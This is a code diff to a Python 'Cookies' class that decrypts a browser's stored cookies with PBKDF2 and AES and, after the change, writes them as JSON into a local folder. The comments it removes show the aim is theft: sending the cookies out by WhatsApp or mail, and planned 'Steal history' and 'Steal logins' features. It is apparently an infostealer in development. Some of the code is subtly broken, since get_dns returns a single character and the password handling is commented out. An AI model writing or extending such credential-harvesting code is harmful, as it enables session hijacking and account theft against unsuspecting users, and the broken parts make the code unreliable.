@@ -9,11 +9,14 @@ from Cryptodome import Cipher
 from Cryptodome.Cipher import AES
 from Cryptodome.Hash import SHA1
 from Cryptodome.Protocol.KDF import PBKDF2
+import json
+import pickle
 
 class Cookies:
 
     def __init__(self, url_cookies):
         self.url_cookies = url_cookies
+
     
     def get_configuration(self) -> dict:
         """Get dict configu
@@ -90,12 +93,12 @@ class Cookies:
         else:
             cookie_file = str(pathlib.Path(setting["cookie_file"]).expanduser())
                 
-        if isinstance(password, bytes):
-            setting["my_pass"] = password
-        elif isinstance(password, str):
-            setting["my_pass"] = password.encode("utf8")
-        elif isinstance(setting["my_pass"], str):
-            setting["my_pass"] = setting["my_pass"].encode("utf8")
+        # if isinstance(password, bytes):
+        #     setting["my_pass"] = password
+        # elif isinstance(password, str):
+        #     setting["my_pass"] = password.encode("utf8")
+        # elif isinstance(setting["my_pass"], str):
+        #     setting["my_pass"] = setting["my_pass"].encode("utf8")
         
 
         enc_key = PBKDF2(
@@ -158,14 +161,13 @@ class Cookies:
         conn.close()
         return cookies
 
+    def get_dns(self, link):
+        return link.strip('.')[1]
     def run(self):
-        print("hello world")
         cookies = self.get_cookies(self.url_cookies)
-        print(cookies)
+        with open("cookies/" + self.get_dns(self.url_cookies), "a") as f:
+            json.dump(cookies, f)
 
-        # Advanced will be sent this to whatsapp or Mail
-        # Todo Steal history
-        # Steal logins
 
 
 
